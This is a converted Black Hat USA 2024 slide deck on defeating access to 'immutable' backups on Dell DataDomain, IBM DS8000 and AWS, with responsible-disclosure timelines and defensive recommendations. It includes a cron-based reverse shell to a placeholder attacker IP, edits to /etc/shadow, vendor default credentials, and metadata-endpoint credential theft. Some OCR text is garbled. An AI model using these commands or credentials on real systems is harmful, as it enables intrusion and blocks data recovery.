---
title: "Are Your Backups Still Immutable, Even Though You Can't Access Them"
speakers: ["Ryan Kane", "Rushank Shetty"]
conference: "Black Hat"
conference_full: "Black Hat USA 2024"
edition: "USA"
year: 2024
source_pdf: "Black Hat USA 2024 slides/Ryan Kane & Rushank Shetty_Are Your Backups Still Immutable, Even Though You Can't Access Them.pdf"
pages: 48
sha256: "9b5e0dfd0b3ea517d75e1611812ce12efd310674d9d412181459f468ed8b2a83"
text_chars: 22537
ocr_pages: 16
has_ocr: true
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T21:38:25Z"
---
# Are Your Backups Still Immutable, Even Though You Can't Access Them

**Speakers:** Ryan Kane, Rushank Shetty  
**Conference:** Black Hat USA 2024  
**Source:** `Black Hat USA 2024 slides/Ryan Kane & Rushank Shetty_Are Your Backups Still Immutable, Even Though You Can't Access Them.pdf` (48 pages)


## Slide 1

**Are Your Backups Still Immutable, Even Though You Can't Access Them?**

Speaker(s):

Rushank Shetty     Ryan Kane

#BHUSA  @BlackHatEvents

## Slide 2

whoami

## INTRO

Data Immutability Background Vendor Case Studies

Recommendations

The Why Q/A

**Intro** > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A

## Slide 3

## WHOAMI

Ryan Kane Northwestern Mutual Pen Tester / Red Teamer CypherCon Volunteer (MKE, WI) Rushank Shetty Northwestern Mutual Pen Tester / Red Teamer First-time Black Hat Attendee / Presenter

Intro > **whoami** > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A

## Slide 4

## BACKUPS AS A TARGET

Backups targeted by Ransomware groups Prevent Restoration = Force Payment

e.g., Alphv / Alpha Spider destroy backups

- using Disk Wipe

- delete Azure Compute snapshots source: CrowdStrike CSIT-23328 – Analysis of Tactics, Techniques, and Procedures Used by ALPHA SPIDER Affiliates in 2023

Intro > whoami > **Ransomware Groups** > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A

## Slide 5

## DATA IMMUTABILITY

Write-Once, Read-Many (WORM)

Retention Lock / Vault Lock

Governance Mode vs Compliance Mode Even root / admin cannot modify data

Intro > whoami > Ransomware Groups > **Data Immutability** > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A

## Slide 6

## TESTING

Why is it needed?

- Ransomware Resilience

- Enterprise Relies on Solutions - Timely Recovery Our Expectations Attack Immutability? Attack Server / App Infrastructure

Intro > whoami > Ransomware Groups > **Data Immutability** > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A

## Slide 7

## OUR TESTED SOLUTIONS

Physical Appliances

1. Dell EMC – DataDomain

2. IBM - DS8000

Cloud Service

3. AWS Backup

Intro > whoami > Ransomware Groups > **Data Immutability** > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A

## Slide 8

DELL / EMC DATA DOMAIN

Target: Dell EMC

DataDomain OS (DDOS… yes, it’s called that) Retention-Lock Compliance Enabled (RLCE)

NOTE: Product solution is now called Dell PowerProtect DD

Intro > whoami > Ransomware Groups > Data Immutability > **Dell/EMC** > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A

## Slide 9

## ENVIRONMENT

### DD Shell (DDSH)

- Jailed Session

- Locked down shell

System Engineer (SE) Mode Users / Access

- Vaulted AD Accounts – Admin, ceded access

- Local Accounts - root, sysadmin, secuser, ddboost

Bash shell – Dell Key Required

Intro > whoami > Ransomware Groups > Data Immutability > **Dell/EMC** > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A

## Slide 10

Intro > whoami > Ransomware Groups > Data Immutability > **Dell/EMC** > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
sysadmin #/system bash enter
This command requires authorization by a user having a 'security' role.
Please present credentials for such a user below.
Username: secuser
Password:
Use existing "Bash Key" or/get "Bash Key" from DD-Support /by providing the following Bash Key sig
This value remains in effect for four hours after which a new Bash Key signing request must be usé
Enter Bash Key: fj
On My Mark: Rotate’Ladnich Keys To Launeh HD'Wargames (1983)
secuser —
Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
```

## Slide 11

Intro > whoami > Ransomware Groups > Data Immutability > **Dell/EMC** > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
sysadmin #/system bash enter
This command requires authorization by a user having a 'security' role.
Please present credentials for such a user below.
Username: secuser
Password:
Use existing "Bash Key" or/get "Bash Key" from DD-Support /by providing the following Bash Key sig
This value remains in effect for four hours after which a new Bash Key signing request must be usé
Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
```

## Slide 12

## DISCOVERY

### Viewing options / reading documentation Failures

- Overwriting data - Unmounting DDFS - Rogue NTP server - etc. Finally! Hidden “REG” command reg show config cron jobs, running as root

Intro > whoami > Ransomware Groups > Data Immutability > **Dell/EMC** > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A

## Slide 13

## EXPLOIT

Using SE Mode to modify config with bash reverse shell:

reg set config.crontab.db_handler = "* * * * * root /bin/ bash -i >& /dev/tcp/<attacker IP>/<attacker port> 0>&1"

Netcat listener on attacker box Pwned!

Intro > whoami > Ransomware Groups > Data Immutability > **Dell/EMC** > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A

## Slide 14

# **DDOS Server**

# **Attack Box**

Intro > whoami > Ransomware Groups > Data Immutability > **Dell/EMC** > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A

## Slide 15

## DESTRUCTION(?)

Still can’t delete data. Immutable. Changed local user PWs in /etc/shadow Removed LDAP conns (vaulted accounts)

<u>RESULT</u>

Backup team can no longer access DDOS Restoration Software no longer connected Restoration of data no longer possible

Intro > whoami > Ransomware Groups > Data Immutability > **Dell/EMC** > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A

## Slide 16

Intro > whoami > Ransomware Groups > Data Immutability > **Dell/EMC** > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bash-4.2#[sed_—i_‘/ddboost/d' etc/shadow |
sed -i '/ddboost/d' /etc/shadow
bash-4.2# cat /etc/shadow
cat /etc/shadow
EF ake
bin: *:13223:0:99999:7:
daemon: *:13223:0:99999
adm: *:13223:0:99999:7:
1p:*:13223:0:99999:7:::
sync: *:13223:0:99999:7::
mail :*:13223:0:99999:7::
news :*:13223:0:99999:7::
uucp :*:13223:0:99999:7::
operator :*:13223:0:99999
7s
27
games :*:13223:0:99999:
gopher :*:13223:0:99999
ftp:*:13223:0:99999:7:
nobody :*:13223:0:99999:7::
vesa:x:213214:0:99999:7:::
rpcuser:x:13214:0:99999:7
cifsuser:x:13214:0:99999:
dbus: !!:13214
sys—internal:x:13214:0:99999
nfsnobody :x:13214:0:99999:7:
sysadmin:
__security_internal__
eseservice:!!:18947
__eseservice__
__pms_user__
secuser:
pentest:
Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
```

## Slide 17

Intro > whoami > Ransomware Groups > Data Immutability > **Dell/EMC** > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pe DataDomain -U “Storage
Server
Server
Server
.com (DOWN)
— aamuncmad j#
Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
```

## Slide 18

## FIX FROM DELL

Reported Finding to Dell

Fixed as part of DSA-2023-412 SE Mode Deprecated

Cannot change / exploit cron jobs Even more locked down

Intro > whoami > Ransomware Groups > Data Immutability > **Dell/EMC** > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A

## Slide 19

HMC (Hardware Mgmt. Console) DS8000 (Data Storage) CSM (Copy Services Manager)

**Plz don’t sue us.**

All on same physical hardware / OS

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A

## Slide 20

## ENVIRONMENT

Target: Only URLs provided No access granted

Prod Only

- Can’t break it

- Can’t make changes

- Be careful

“Give it your best shot.”

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A

## Slide 21

### <u>HMC default creds:</u>

**Username Password** root <u>passw0rd</u> hscroot abc123 customer cust0mer CE serv1cece – Remote Login Disabled (?) …

<u>DS8000 default creds:</u> **Username Password** secadmin secadmin service serv1cece engineering serv1cepe

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A

## Slide 22

Default Creds for HMC and DS8000

## LEARNING THE ENVIRONMENTS

Ultimate goal - Access CSM

Learn without persistent changes Spoiler alert – No access to CSM

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A

## Slide 23

Disabled.

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A

## Slide 24

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Welcome to the Hardware Management Console
CE is not allowed to log on remotely.
Please contact next level of support if you need to enable remote log in.
Username
CE
Password
Logon
CR © Inspector ©) Console © Debugger TN Network {} Style Ec
Q Search HTML
<div class="errormainLyt”™>
> <div class="pmcLabel"> (=) </div>
> <div class="pmcField"> (=) </div>
> <table> (=) </table>
> <div class="pmcLabel"> (*") </div> |
> <div class="pmcPassField">(*) </div>
<input type="hidden” name="j_newConsole” value="No"> §
> <div style="text-align: left; margin-bottom: 15px;">(=)<] __
> <div id="tcCheckBoxDiv" style="text-align: left; margin-
display:none; "> (=) </div>
wv <div class="loginButton” style="margin-bottom: 15px;">
</div>
> <div style="text-align: left;">(=)</div>
</div>
</form>
```

## Slide 25

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Hardware Management Console
CE | Help | Logoff
Welcome ( HNC Version )
5 Welcome Use the Hardware Management Console (HMC) to manage this HMC as well as servers, logical partitions, managed systems, and other resources. Click on a link in the navigation pane at the left.
6
] Storage Facility Management | Systems Management Manage servers, logical partitions, managed systems, and frames; set up, configure, view current status, troubleshoot, and apply solutions
! Bumc Management ff} System Plans Import, deploy, and manage system plans on the HMC.
9
43 service Management
Buc Management Perform management tasks to set up, configure, and customize operations associated with this HMC.
i f) Updates
? Xf Service Management Perform service tasks to create, customize and manage services associated with this HMC
|
{I Updates Perform and manage updates on your system.
|
| & Status Bar View details of status and messages
|
|
| Additional Resources
| Ej Guided Setup Wizard Provides a step-by-step process to configure your HMC.
|
a
5 if HT f he HMC v 4
r ie peat and configuring the eve guide Provides an online version of Installing and configuring the HMC v8 guide for system administrators and system operators using the HMC
: View as HTML
; @) ae ine RC ve mute Provides an online version of Managing the HMC v8 guide for system administrators and system operators using the HMC
View as HIML
4
/ he HMC v:
| 2) soning ue eve guide Provides an online version of Servicing the HMC v8 guide for system administrators and system operators using the HMC.
Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
```

## Slide 26

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
1e) & oe https:// | V/hmc/content?taskld= 657 &refresh= 1405 (@) & o2 https://§ = et/nmc/content?taskid=657 &refresh= 1405
Back Back
Enter the file name and click OK. The file must exist on the console.
o OK
S)
There was an internal error processing the request.
ACT@85@2E
ae cs Fel Date al = mm —
= OA = https:/)_ onl ‘/hme/content?taskld=657 &refresh= 1405
Back
Enter the file name and click OK. The file must exist on the console.
/etc/not_a_real_file
e file either does not exist, is not accessible, or is the name of a directory.
ACT@8510I
OK
```

## Slide 27

## DS CLI

Inside DS 8000 application Small shell inside GUI

Jailed / limited set of commands Upload or load local script containing commands

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A

## Slide 28

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Pretty Raw Hex
iS |------ WebKitFormBoundaryiamSt8shpSNLI4RP
24 Content-Disposition: form-data; name="DSCLIFileInput";| filename="ast.sh"|| —
5 Content-Type: text/x-sh :
Ses ae ©
SS #!/bin/bash =
id
whoami
ESSENSE.
Response
Pretty Raw Hex Render
eclluns Cluse
14
15 {
"clazz":"com.ibm.gem.servlets .DSCLIFileUploadHandler$DSCLIFileUploadJSONResult",
"success":true,
"fileName": "ast.sh",
"fileLocation":"/tmp/embeddedDSCLI/74hNp7Zra8zZZO0VifKpcAtC/ast.sh"
}
16
```

## Slide 29

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Request
Pretty Raw Hex
a
"clazz": "com. ibm.evo.rpc.RPCRequest",
"methodClazz":"com.ibm.gem.dscli.DSCLIRPC",
"clazz":"com. ibm.evo.rpc.RP¢
“messages":[
1,
"result" :{
"clazz":"com.ibm.gem.dscli.beans.DSCLISessionBean",
"“sessionID":"service_HU6ydx",
"alive": false,
“redirectErrorStream":true,
“output":
CMNCTOO13E Command: id was not found.\nTip: Enter \"help\" for a list of available commands.\n",
"currentUser": "service",
“currentRole":"IBM service"
```

## Slide 30

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Request
Pretty Raw Hex
20
21 {
"clazz":"com. ibm.evo.rpc.RPCRequest",
"methodClazz":"com.ibm.gem.dscli.DSCLIRPC",
Response "methodName": "executeDSCLICommand",
| Pretty Raw Hex "methodArgs":[
15 { "ryan _uvLwit",
"clazz": "com. ibm.evo.rpc.RPCResponse"
"/etc/shadow",
eee Fe "script'
’
"result" :{ ]
"clazz": "com. ibm.gem.dscli.beans.DS( }
"sessionID":"ryan_uvLwit",
"alive": false,
“redirectErrorStream":true,
"“exitValue":2,
"output":
"CMMCI9013E Command: root:
>19620:0:99999:7::: was not found.\nTip: Enter \"help\" for a lis
t of available commands.\n",
“error :”
},
"currentUser": "ryan",
“currentRole":"Security administrator"
}
16
Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
```

## Slide 31

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Request
Pretty Raw Hex
at
"clazz": "com. ibm.evo.rpc.RPCRequest",
“"methodClazz":"com.ibm.gem.dscli.DSCLIRPC",
"methodName": "removeScript", =
"“methodArgs":| a
"7home/ryan/.bashrc" Se ee
] = & ¥ “ ae a -
} i Sa
_ Response a eae
NK tea ; Pretty Raw Hex Render fas
E has, 114
ae 15 {
2 "clazz":"com.ibm.evo.rpc.RPCResponse",
"messages":[
>
"result":{
"clazz": "com. ibm.gem.dscli.beans.DSCLISessionBean",
"sessionID":"ryan_uvLwit",
"alive":false,
"“redirectErrorStream":true,
"exitVv "30,
Froutput": "Script file not found: /home/ryan/.bashrc\n",
error”:
},
“currentUser": "ryan",
“currentRole":"Security administrator"
```

## Slide 32

## IMPACT

1. Access with default creds

2. Enumerate files

3. Read 1<sup>st</sup> line of any file (as root)

4. Delete any file (as root)

System Outage?

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A

## Slide 33

## CHALLENGES

Challenges: Lack of Non-Prod Env Testing was felt to not be comprehensive Possibility for more findings? Findings (4) reported to IBM PSIRT Fixes published early March 2024

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A

## Slide 34

AWS

Industry Standard:

- Uses compliance mode - Uses retention lock

Organizations

- Many accounts

- “POC-Backup” (AWS Backup) account

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > **AWS Backup** > Recommendations > Why test > Q/A

## Slide 35

## AWS TESTING METHODOLOGY

Gain Access

Traverse Accounts Using Assume-Role

Escalate Privileges

Delete POC-Backup account?

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > **AWS Backup** > Recommendations > Why test > Q/A

## Slide 36

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > **AWS Backup** > Recommendations > Why test > Q/A

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
i a
Dir $]docker pull : latest
latest: rutting trom
6097bfai60c1: Already exists
28fbabb27267: Already exists
e4ebc9af5a59: Already exists
85f0882a33ae: Already exists
fbe421fe1821: Already exists
c6407d9d7248: Already exists
46495d550032: Already exists
aec5677d55a4: Already exists
aca320c6a318: Already exists
bash-5.1# cat config.json
{
“auths": {
Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
```

## Slide 37

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > **AWS Backup** > Recommendations > Why test > Q/A

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
@ontine 80 Group HE created 2 months ago
Details
Description
Configuration
Paused
St
p the runner from accepting new jobs.
Protected
Use the runner on pipelines for protected branches only
Run untagged jobs
Use the runner for jobs without tags, in addition to tagged jobs
Maximum job timeout
stages: Enter the number of seconds. This timeout takes precedence over lower timeouts set for the project
- testing
Tags
testing:
stage: testing HE unner
tags:
#-
#-
#-
You can set up jobs to only use runners with specific tags. Separate tags with commas
#-
- - runner
script:
- wget ee / re leases/latest/download/curl-amd64 -0 curl
- chmod a+x curl
->
TOKEN="./curl -X PUT “http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"* && ./curl -H "X-aws-ec2-metadata-token: $TOKEN"
-v
http://169.254.169.254/latest/meta-data/iam/security-credentials/ i -runner-prod
Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
```

## Slide 38

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > **AWS Backup** > Recommendations > Why test > Q/A

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
* Closing connection
"Code" : "Success",
"LastUpdated" : "2023-12-05T17:34:19Z",
"Type" : "AWS-HMAC",
"AccessKeyId" : mo ee
"SecretAccessKey" : i | EE mo 8 2 =
"Token" : "IQoJb3JpZ2LuX2VjEBLaCXVZLWVhc3QtMSJGMEQCICIAUJNWEBVMOXrxUuzCSwTeOcVui4Y1ZmawIShQy7APAiBk/LqROQAtFh2PTGSF3fgF4
a a MEE EEN EES ES ee EEE = | 8. oe m= 8 |
T i > ie | a nn | | a 8 | a = oe 6 BH: 8
ae an [asl = a a a ba = m8 ee ee
|
na 8 == i ood ae = a _* cose emeee
a | ao oe Se LL:
picky ke ueees {heat dye
|
= =
el i ee eo Le
"Expiration" : "2023-12-05T23:51:55Z"
}
Vv 69 Cleaning up project directory and file based variables
71 Job succeeded
130 « $ aws sts get-caller-identity
"UserId":
Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
```

## Slide 39

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > **AWS Backup** > Recommendations > Why test > Q/A

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
BR Management
Cloud Account HP oc
Provider ID ooo
Resource ID servicerolc ia
Direct Link https://console.aws.amazon.com/iam/home...
perties (4) Actions (2) Tags (6) Insight Findings
1
2 "Version": "2012-10-17",
3 "Statement": [
4
5 "Action": "sts:AssumeRole",
6 "Effect": "Allow"
7 Principal":
8
9 “arn:aws: iam: 3: ro le /-deployer",
10 “arn:aws: iam: : 6S : ro le / I —runner-prod"
11
12 }
13 }
14 ]
15}
ID (ARN)
Region
Date Discovered
Latest Harvest
Related Resources
arn:aws:iam::_S7:role/or.. O]
N/A
2021-07-27
2024-01-10 (23:22) UTC
Inline Policies IAM Policy
Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
```

## Slide 40

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > **AWS Backup** > Recommendations > Why test > Q/A

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
View Document
The policy document in JSON format
{
"Version": "2012-10-17",
"Statement": [
{
"Action": "x",
"Effect": "Allow",
"Resource": "x"
```

## Slide 41

#### ATTACK PATH (AWS)

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > **AWS Backup** > Recommendations > Why test > Q/A

## Slide 42

#### POSSIBLE RAMIFICATIONS (AWS)

Stop Backups?

Delete SSO admin assignments? Gain AWS root privs?

Delete AWS Backup Account?

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > **AWS Backup** > Recommendations > Why test > Q/A

## Slide 43

Recovery MAY be possible with vendor help RECOMMENDATIONS (FOR ALL SOLUTIONS) Change Default Creds Vault Creds / Limit Access MFA Everything Alerting / Monitoring Keep Software Up to Date Off-Site Backups (3-2-1) Allow Security Researchers to Test (!)

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > **Recommendations** > Why test > Q/A

## Slide 44

WHY INCLUDE IN ATTACK LANDSCAPE?

Disaster Recovery vs. Attack Protection If Data is inaccessible, is it really immutable? Don’t rely on vendors to do all testing Ultimately just computers

and… because it’s fun!

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > **Recommendations** > Why test > Q/A

## Slide 45

A FEW OTHER IMMUTABLE BACKUP SOLUTIONS

Azure Immutable Storage for Blob Storage Google Cloud Storage – Immutable Backups Oracle Recovery Appliance Veritas NetBackup BMC Software Veeam Rubrik Commvault Cohesity Acronis Many more!

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > **Why test** > Q/A

## Slide 46

9/7/2023

## TIMELINE DELL

Reported to Dell / Dell acknowledges receipt 9/14/2023

Dell has investigated and validated findings 10/17/2023 – 11/9/2023

Dell DDOS Support sends constant updates 11/9/2023

Fix checked into code by Dell DDOS Eng. Team 12/13/2023

CVE-2023-44279

Dell publishes Security Advisory DSA-2023-412

https://www.dell.com/support/kbdoc/en-us/000220264/dsa-2023-412-dell-technologies-powerprotect-security-update-for-multiple-security-vulnerabilities

## Slide 47

10/6/2023

## TIMELINE IBM

Reported to IBM 11/29/2023

IBM sends disclosure policy / We respond w/ Industry Standard 90-day disclosure timeline 12/5/2023, 1/22/2024

IBM asks for extension, 30-day extension granted, IBM states extension will not be met

CVE-2023-46169 CVE-2023-46170 CVE-2023-46171 CVE-2023-46172

(Developer Tools… LOL)

2/7/2024 - Extension Expires

IBM doesn’t know when fixes will be completed, advises against disclosure

3/7/2024 IBM issues public notice of fixes

https://www.ibm.com/support/pages/node/7130084

## Slide 48

### BLACK HAT SOUND BYTES

Your data may be immutable, the servers hosting it are not. Increase ransomware resilience by testing your vendor’s immutability solution.

Affecting accessibility of backups may coerce payment; another form of holding data ransom.

FIN.

Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > **Q/A**
